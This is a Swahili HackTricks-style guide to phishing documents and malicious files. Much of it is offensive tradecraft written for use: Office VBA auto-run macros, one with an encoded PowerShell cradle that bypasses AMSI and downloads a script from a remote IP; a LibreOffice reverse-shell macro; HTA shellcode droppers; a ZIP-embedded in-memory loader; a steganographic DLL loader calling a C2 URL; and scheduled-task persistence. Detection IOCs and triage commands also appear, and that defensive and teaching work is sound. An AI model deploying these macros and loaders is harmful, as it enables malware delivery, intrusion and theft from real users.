# Faili na Hati za Phishing

{{#include ../../banners/hacktricks-training.md}}

## Hati za Office

Microsoft Word hukagua uhalali wa data ya faili kabla ya kuifungua. Ukaguzi wa uhalali wa data hufanywa kwa kutambua muundo wa data na kuulinganisha na kiwango cha OfficeOpenXML. Ikiwa hitilafu yoyote itatokea wakati wa utambuzi wa muundo wa data, faili inayochanganuliwa haitafunguliwa.

Kwa kawaida, faili za Word zilizo na macros hutumia kiendelezi cha `.docm`. Hata hivyo, inawezekana kubadilisha jina la faili kwa kubadilisha kiendelezi chake na bado macro zake zikaendelea kutekelezwa.\
Kwa mfano, faili ya RTF haiwezi kutumia macros kwa muundo wake, lakini faili ya DOCM ikibadilishwa jina na kuitwa RTF itashughulikiwa na Microsoft Word na itaweza kutekeleza macros.\
Mifumo na taratibu zilezile za ndani hutumika kwa programu zote za Microsoft Office Suite (Excel, PowerPoint n.k.).

Unaweza kutumia amri ifuatayo kuangalia ni viendelezi vipi vitatekelezwa na baadhi ya programu za Office:

```bash
assoc | findstr /i "word excel powerp"
```

Faili za DOCX zinazorejelea template ya mbali (File –Options –Add-ins –Manage: Templates –Go) iliyo na macros zinaweza pia “kutekeleza” macros.

### Upakiaji wa Picha ya Nje

Nenda kwenye: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, na **Filename or URL**:_ http://<ip>/whatever

![Office Documents - Upakiaji wa Picha ya Nje: Nenda kwenye: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Backdoor ya Macros

Inawezekana kutumia macros kutekeleza msimbo wowote kutoka kwenye hati.

#### Kazi za Kupakia Kiotomatiki

Kadiri zinavyotumika sana, ndivyo uwezekano wa AV kuzigundua unavyoongezeka.

- AutoOpen()
- Document_Open()

#### Mifano ya Msimbo wa Macros

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Ondoa metadata mwenyewe

Nenda kwa **File > Info > Inspect Document > Inspect Document**, ili kufungua Document Inspector. Bofya **Inspect**, kisha **Remove All** kando ya **Document Properties and Personal Information**.

#### Kiendelezi cha Doc

Ukimaliza, chagua menyu kunjuzi ya **Save as type**, badilisha umbizo kutoka **`.docx`** hadi Word 97-2003 **`.doc`**.\
Fanya hivi kwa sababu **huwezi kuhifadhi macro ndani ya `.docx`** na kuna **unyanyapaa** **unaohusishwa na** kiendelezi cha **`.docm`** chenye macro (kwa mfano, ikoni ya kijipicha ina `!` kubwa, na baadhi ya gateway za wavuti/barua pepe huzizuia kabisa). Kwa hiyo, **kiendelezi hiki cha zamani cha `.doc` ndicho suluhisho la kati lililo bora zaidi**.

#### Jenereta za Macro hasidi

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Macro za LibreOffice ODT zinazojiendesha zenyewe (Basic)

Hati za LibreOffice Writer zinaweza kupachika macro za Basic na kuzifanya zitekelezwe kiotomatiki faili inapofunguliwa kwa kuhusisha macro na tukio la **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Macro rahisi ya reverse shell inaonekana hivi:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Kumbuka alama za nukuu zilizorudiwa (`""`) ndani ya string – LibreOffice Basic huzitumia kuweka alama za nukuu halisi, kwa hivyo payloads zinazoishia na `...==""")` hudumisha uwiano wa mabano ya ndani ya command na hoja ya Shell.

Vidokezo vya uwasilishaji:

- Hifadhi kama `.odt` na uunganishe macro na tukio la hati ili iendeshwe mara tu hati inapofunguliwa.
- Unapotuma barua pepe kwa `swaks`, tumia `--attach @resume.odt` (`@` inahitajika ili bytes za faili, badala ya string ya jina la faili, zitumwe kama attachment). Hili ni muhimu unapozitumia vibaya SMTP servers zinazokubali wapokeaji wa `RCPT TO` kiholela bila uthibitishaji.

## Faili za HTA

HTA ni programu ya Windows **inayounganisha HTML na lugha za scripting (kama VBScript na JScript)**. Hutengeneza kiolesura cha mtumiaji na kuendeshwa kama programu "inayoaminika kikamilifu", bila vikwazo vya modeli ya usalama ya browser.

HTA huendeshwa kwa kutumia **`mshta.exe`**, ambayo kwa kawaida **husakinishwa** pamoja na **Internet Explorer**, hivyo **`mshta` hutegemea IE**. Kwa hiyo, ikiwa imeondolewa, HTA hazitaweza kuendeshwa.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Kulazimisha Uthibitishaji wa NTLM

Kuna njia kadhaa za **kulazimisha uthibitishaji wa NTLM kwa mbali**, kwa mfano, unaweza kuongeza **picha zisizoonekana** kwenye barua pepe au HTML ambayo mtumiaji atafungua (hata HTTP MitM?). Au umtumie mwathiriwa **anwani ya faili** itakayochochea **uthibitishaji** anapofungua tu **folda**.

**Angalia mawazo haya na mengine kwenye kurasa zifuatazo:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Usisahau kwamba unaweza kufanya zaidi ya kuiba hash au uthibitishaji; unaweza pia **kufanya mashambulizi ya NTLM relay**:

- [**Mashambulizi ya NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay kuelekea vyeti)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + Payloads Zilizopachikwa ndani ya ZIP (msururu usio na faili)

Kampeni zenye ufanisi mkubwa husambaza ZIP iliyo na nyaraka mbili halali za kupotosha (PDF/DOCX) na .lnk hasidi. Mbinu yake ni kwamba loader halisi ya PowerShell imehifadhiwa ndani ya byte ghafi za ZIP baada ya alama ya kipekee, kisha .lnk huitoa na kuiendesha yote kwenye kumbukumbu.<sup>[[2]](#references)</sup>

Mtiririko wa kawaida unaotekelezwa na amri fupi ya PowerShell ya .lnk:

1) Tafuta ZIP asilia kwenye njia za kawaida: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, na folda ya mzazi ya saraka ya sasa ya kazi.
2) Soma byte za ZIP na utafute alama iliyowekwa mapema (k.m., xFIQCV). Kila kitu baada ya alama hiyo ni payload ya PowerShell iliyopachikwa.
3) Nakili ZIP hadi %ProgramData%, ifungue hapo, kisha ufungue .docx ya kupotosha ili ionekane halali.
4) Epuka AMSI kwa mchakato wa sasa: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Ondoa ufichaji wa hatua inayofuata (k.m., ondoa vibambo vyote vya #) kisha uitekeleze kwenye kumbukumbu.

Mfano wa muundo wa msingi wa PowerShell wa kutoa na kuendesha hatua iliyopachikwa:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Vidokezo
- Usambazaji mara nyingi hutumia vibaya subdomain za PaaS zinazotegemewa (k.m., *.herokuapp.com) na unaweza kuweka masharti ya kufikia payloads (kuwasilisha ZIP zisizo na madhara kulingana na IP/UA).
- Hatua inayofuata mara nyingi husimba shellcode ya base64/XOR na kisha kuitekeleza kupitia Reflection.Emit + VirtualAlloc ili kupunguza athari kwenye diski.

Persistence inayotumika kwenye chain hiyo hiyo
- COM TypeLib hijacking ya kidhibiti cha Microsoft Web Browser ili IE/Explorer au app yoyote inayokipachika izindue tena payload kiotomatiki.<sup>[[2]](#references)[[4]](#references)</sup> Tazama maelezo na amri zilizo tayari kutumika hapa:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Uwindaji/IOCs
- Faili za ZIP zilizo na mfuatano wa alama wa ASCII (k.m., xFIQCV) ulioongezwa kwenye data ya archive.
- Faili ya .lnk inayoorodhesha folda za mzazi/mtumiaji ili kupata ZIP na kufungua hati ya chambo.
- Kuharibu AMSI kupitia [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Threads za biashara zinazoendelea kwa muda mrefu na kuishia na links zinazopangishwa chini ya domain za PaaS zinazoaminika.

## Uwekaji wa chambo cha LNK kwanza → persistence kupitia scheduled task → trusted CPL side-loading

Muundo mwingine unaojirudia ni **`.lnk` inayoiga hati** ambayo hufungua mara moja kishawishi kisicho na madhara huku ikiandaa chain halisi chinichini.<sup>[[3]](#references)</sup>

Mtiririko ulioonekana:
1. Shortcut **hujifanya kuwa PDF** na kutumia `conhost.exe` au proxy inayofanana kuzindua downloader ya PowerShell iliyofichwa.
2. PowerShell hugawa tokeni zinazoonekana wazi (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) ili uchunguzi rahisi unaotafuta `iwr`, `gci`, `ren`, `cpi`, au `schtasks` ukose amri hiyo.
3. Stager hupakua **hati ya chambo kwanza**, huifungua kwa mwathiriwa, kisha huunda upya faili hasidi chinichini.
4. Payloads zinaweza kuandikwa zikiwa na **viendelezi vya kupotosha**, kisha kupewa majina mapya kwa kuondoa herufi za kujaza, hivyo kuchelewesha kuonekana kwa faili dhahiri za `.exe` / `.cpl`.
5. Persistence huwekwa kwa **scheduled task inayotumia vipindi vya dakika** na kuzindua binary ya host inayoaminika kutoka kwenye njia ambayo mtumiaji anaweza kuandikia.

Vidokezo vya msingi vya uwindaji kutoka kwenye muundo huu:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Mpangilio muhimu wa staging wa kutambua ni:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` au `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Kwa nini hatua ya pili ni fiche

Katika case study ya Rapid7, scheduled task ilizindua **`Fondue.exe`** mara kwa mara kutoka `C:\Users\Public\`. Kwa kuwa **`APPWIZ.cpl`** iliwekwa kwenye saraka hiyo hiyo na ku-export **`RunFODW`**, binary inayoaminika ya Microsoft ilipakia CPL ya mshambuliaji badala ya nakala halali ya mfumo.

Kisha CPL:
- Husoma blob ya **AES-256-CBC** kutoka `C:\Windows\Tasks\editor.dat`
- Hu-decrypt blob hiyo kupitia **Windows CNG / `bcrypt.dll`**
- Hutenga memory inayoweza kutekelezeka na kunakili shellcode iliyo-decryptiwa humo
- Hui-execute kwa njia isiyo ya moja kwa moja kwa kupitisha pointer ya shellcode kama callback ya **`EnumUILanguagesW`**

Hatua hiyo ya mwisho inafaa kuchunguzwa kando: malware mara nyingi huepuka kuruka moja kwa moja kwa `((void(*)())buf)()` na badala yake hutumia vibaya **WinAPI halali inayopokea callback** kuhamisha execution.

Payload iliyo-decryptiwa katika kampeni hii ilikuwa shellcode ya **Donut**, ambayo kisha ili-map PE ya mwisho kikamilifu kwenye memory na kufanya patch kwa **AMSI/WLDP/ETW** katika process ya sasa kabla ya kukabidhi execution. Kwa maelezo zaidi kuhusu side-loading na post-processing inayokaa kwenye memory, tazama:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Njia za vitendo za kuanza uchunguzi:
- `.lnk` inayozindua `powershell.exe` au `conhost.exe`, kisha kufungua hati ya decoy inayoonekana.
- Vipakuliwa vya muda mfupi kwenda **`C:\Users\Public\`**, vikifuatiwa mara moja na kubadilishwa majina kutoka kwenye viendelezi visivyo na maana.
- Scheduled tasks zenye majina ya kawaida kama `GoogleErrorReport` zinazotekelezwa kutoka **saraka ambazo mtumiaji anaweza kuandika**.
- Binary zinazoaminika zinazopakia faili za **`.cpl` / `.dll`** kutoka kwenye saraka hiyo hiyo isiyo ya mfumo.
- Blob za maandishi za Base64 zinazoandikwa chini ya **`C:\Windows\Tasks\`** na kisha kusomwa na module iliyopakiwa kwa side-loading.

## Payloads zilizotenganishwa kwa steganografia kwenye picha (PowerShell stager)

Mlolongo wa loader wa hivi karibuni huwasilisha JavaScript/VBS iliyofichwa ambayo hu-decode na kuendesha PowerShell stager ya Base64. Stager hiyo hupakua picha (mara nyingi GIF) iliyo na .NET DLL iliyosimbwa kwa Base64 na kufichwa kama maandishi ya kawaida kati ya alama za kipekee za mwanzo/mwisho. Script hutafuta alama hizo za kutenganisha (mifano iliyoonekana kwenye mazingira halisi: «<<sudo_png>> … <<sudo_odt>>>»), hutoa maandishi yaliyo katikati, hu-decode Base64 kuwa bytes, hupakia assembly kwenye memory na kuita entry method inayojulikana pamoja na URL ya C2.<sup>[[5]](#references)</sup>

Mtiririko wa kazi
- Hatua ya 1: JS/VBS dropper iliyohifadhiwa kwenye archive → hu-decode Base64 iliyopachikwa → huzindua PowerShell stager kwa kutumia -nop -w hidden -ep bypass.
- Hatua ya 2: PowerShell stager → hupakua picha, huchopoa Base64 iliyotenganishwa kwa alama, hupakia .NET DLL kwenye memory na kuita method yake (kwa mfano, VAI) ikipitisha URL ya C2 na chaguo.
- Hatua ya 3: Loader hupata payload ya mwisho na kwa kawaida hui-inject kupitia process hollowing ndani ya binary inayoaminika (mara nyingi MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Tazama maelezo zaidi kuhusu process hollowing na utekelezaji kupitia proxy ya utility inayoaminika hapa:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Mfano wa PowerShell wa kuchopoa DLL kutoka kwenye picha na kuita method ya .NET kwenye memory:

<details>
<summary>Kichopoa na kipakiaji cha PowerShell cha stego payload</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Maelezo
- Hii ni ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Markers hutofautiana kati ya kampeni.
- AMSI/ETW bypass na string deobfuscation hutumika mara nyingi kabla ya kupakia assembly.
- Uwindaji: changanua picha zilizopakuliwa kutafuta delimiters zinazojulikana; tambua PowerShell inayofikia picha na mara moja kusimbua blobs za Base64.

Tazama pia zana za stego na mbinu za kuchimba data:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Uwekaji wa PowerShell kupitia Base64

Hatua ya awali inayojirudia ni faili ndogo ya `.js` au `.vbs` iliyofichwa sana, inayowasilishwa ndani ya archive. Kusudi lake pekee ni kusimbua mfuatano wa Base64 uliopachikwa na kuwasha PowerShell kwa `-nop -w hidden -ep bypass` ili kuanzisha hatua inayofuata kupitia HTTPS.<sup>[[5]](#references)</sup>

Mantiki ya msingi (ya kidhahania):
- Soma yaliyomo kwenye faili yenyewe
- Tafuta blob ya Base64 kati ya mfuatano wa maandishi taka
- Simbua hadi PowerShell ya ASCII
- Itekeleze kwa `wscript.exe`/`cscript.exe` ikiwasha `powershell.exe`

Viashiria vya uwindaji
- Viambatisho vya JS/VBS vilivyowekwa kwenye archive vinavyoanzisha `powershell.exe` huku `-enc`/`FromBase64String` ikiwa kwenye mstari wa amri.
- `wscript.exe` inayoanzisha `powershell.exe -nop -w hidden` kutoka kwenye njia za muda za mtumiaji.

## Hati za MSC kama vyombo vya utekelezaji (GrimResource)

Faili za Microsoft Management Console (`.msc`) ni fasili za console za XML ambazo kwa kawaida hufunguliwa na `mmc.exe`. **GrimResource** hutumia vibaya rejeleo la `StringTable` kwa rasilimali ya `apds.dll` iliyo na mbinu ya zamani ya XSS, ili mtumiaji anapofungua console iliyoundwa mahsusi, JavaScript iendeshwe ndani ya `mmc.exe`. Sampuli zilizozingatiwa ziliunganisha obfuscation inayotegemea `transformNode` na **DotNetToJScript** ili kuanzisha payload ya .NET bila kutumia njia ya kawaida ya Office macro.<sup>[[9]](#references)</sup>

Kwa uchunguzi tuli, ichukulie MSC isiyoaminika kama maandishi na **usiibofye mara mbili**:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Viashiria muhimu vya runtime ni `mmc.exe` kupakia CLR au vipengele vya script, kuunda miunganisho ya mtandao, au kuanzisha `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe`, au executable isiyotarajiwa. Umbizo hili ni halali, kwa hivyo ugunduzi unapaswa kuhusisha **asili + maudhui ya XML/script yanayotiliwa shaka + tabia ya `mmc.exe`** badala ya kuzuia kila MSC.<sup>[[9]](#references)</sup>

## PDF/QR za kuelekeza upya na udhibiti wa payload

PDF haihitaji kutumia exploit ili kuwa na manufaa. Kampeni za hivi majuzi huweka **msimbo wa QR au kiungo cha kawaida** katika hati inayoonekana kuwa salama, huhamisha kipindi cha kivinjari mbali na vidhibiti vya barua pepe, na kubinafsisha anwani lengwa kwa kutumia anwani ya mpokeaji. Microsoft iliandika kuhusu PDF za mwaka 2025 ambazo URL za QR zilikuwa za kipekee kwa kila mpokeaji na kuelekeza kwenye miundombinu ya wizi wa vitambulisho vya RaccoonO365; msururu sambamba ulitumia udhibiti wa ufikiaji kwa IP/mazingira ili kuonyesha njia ya JavaScript/MSI kwa wageni waliochaguliwa, lakini PDF salama kwa vichanganuzi au wateja wasioruhusiwa.<sup>[[10]](#references)</sup>

Chunguza vitendo vya PDF pamoja na misimbo ya QR inayoonyeshwa. QR inaweza kuchorwa kama vekta badala ya kuhifadhiwa kama picha inayoweza kutolewa, kwa hivyo badilisha kila ukurasa kuwa picha na pia utoe picha zilizopachikwa:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Kagua destinations zilizofasiliwa na uelekezaji upya kutoka kwa mfumo wa uchanganuzi uliotengwa bila kuthibitisha utambulisho. Vipengele muhimu vya kutafuta ni pamoja na PDFs zenye QR code pekee na maudhui ya barua pepe yaliyo karibu kuwa matupu, anwani ya barua pepe ya mpokeaji iliyopachikwa kwenye kigezo cha query, uelekezaji upya kadhaa kupitia huduma za upangishaji zinazoaminika, na maudhui tofauti yanayorudishwa kulingana na IP, eneo la kijiografia, cookies, referrer au user agent. Linganisha maombi kwa kutumia profaili zinazodhibitiwa kwa sababu fetch moja tu kutoka sandbox inaweza kupokea decoy pekee.<sup>[[10]](#references)</sup>

## Faili za Windows za kuiba NTLM hashes

Angalia ukurasa kuhusu **maeneo ya kuiba NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Utafiti wa Check Point – Kampeni ya ZipLine: Shambulio la kisasa la phishing linalolenga kampuni za Marekani](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Kufuatilia mbinu za Dropping Elephant kupitia mnyororo wa loader wenye mandhari ya China](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Tekwa TypeLib – Mbinu mpya ya COM persistence (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader inasambaza aina mbalimbali za infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Utekelezaji kupitia proxy ya huduma za msanidi zinazoaminika: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console kwa ufikiaji wa awali na kukwepa ulinzi](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Blogu ya Usalama ya Microsoft – Watendaji wa vitisho wanatumia msimu wa kodi kusambaza kampeni za phishing zenye mandhari ya kodi](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
